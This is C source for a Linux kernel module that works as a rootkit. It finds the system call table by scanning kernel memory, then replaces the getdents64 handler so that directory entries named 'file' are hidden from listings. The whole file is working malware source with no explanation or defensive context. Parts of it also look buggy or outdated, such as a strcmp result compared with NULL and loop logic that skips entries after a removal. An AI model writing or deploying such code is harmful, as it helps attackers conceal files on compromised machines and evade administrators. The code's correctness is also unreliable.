#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/dirent.h>
#include <linux/syscalls.h>

MODULE_LICENSE ("GPL");

int (*orig_getdents)(u_int fd, struct dirent *dirp, u_int count);

unsigned long* sys_call_table;

static char *hide = "file";

void find_sys_call_table(void)
{
  int i;
  unsigned long *ptr;
  unsigned long arr[4];
  ptr = (unsigned long *)((init_mm.end_code + 4) & 0xfffffffc);
  while ((unsigned long)ptr < (unsigned long)init_mm.end_data) {
    if (*ptr == (unsigned long)((unsigned long *)sys_close)) {
      for (i = 0; i < 4; i++) {
	arr[i] = *(ptr + i);
	arr[i] = (arr[i] >> 16) & 0x0000ffff;
      }
      if (arr[0] != arr[2] || arr[1] != arr[3]) {
	sys_call_table = (ptr - __NR_close);
	break;
      }
    }
    ptr++;
  }
}


int new_getdents(u_int fd, struct dirent *dirp, u_int count)
{
  unsigned int tmp, n;
  int t;

  struct dirent64 {
    int d_ino1, d_ino2;
    int d_off1, d_off2;
    unsigned short d_reclen;
    unsigned char d_type;
    char d_name[0];
  } *dirp2, *dirp3;

  tmp = (*orig_getdents)(fd, dirp, count);
  
  if (tmp > 0) {
    dirp2 = (struct dirent64 *)kmalloc(tmp, GFP_KERNEL);
    copy_from_user(dirp2, dirp, tmp);
    dirp3 = dirp2;
    t = tmp;

    while (t > 0) {
      n = dirp3->d_reclen;
      t -= n;
      if (strcmp((char*)&(dirp3->d_name), hide) == NULL) {
        memcpy(dirp3, (char *)dirp3 + dirp3->d_reclen, t);
        tmp -= n;
      }
      dirp3 = (struct dirent64 *)((char *)dirp3 + dirp3->d_reclen);
    }

    copy_to_user(dirp, dirp2, tmp);
    kfree(dirp2);
  }

  return tmp;
}


int init_module(void)
{
  find_sys_call_table();
  orig_getdents = (void *)sys_call_table[__NR_getdents64];
  sys_call_table[__NR_getdents64] = (unsigned long)new_getdents;
  return 0;
}


void cleanup_module()
{
  sys_call_table[__NR_getdents64] = (unsigned long)orig_getdents;
}
	 

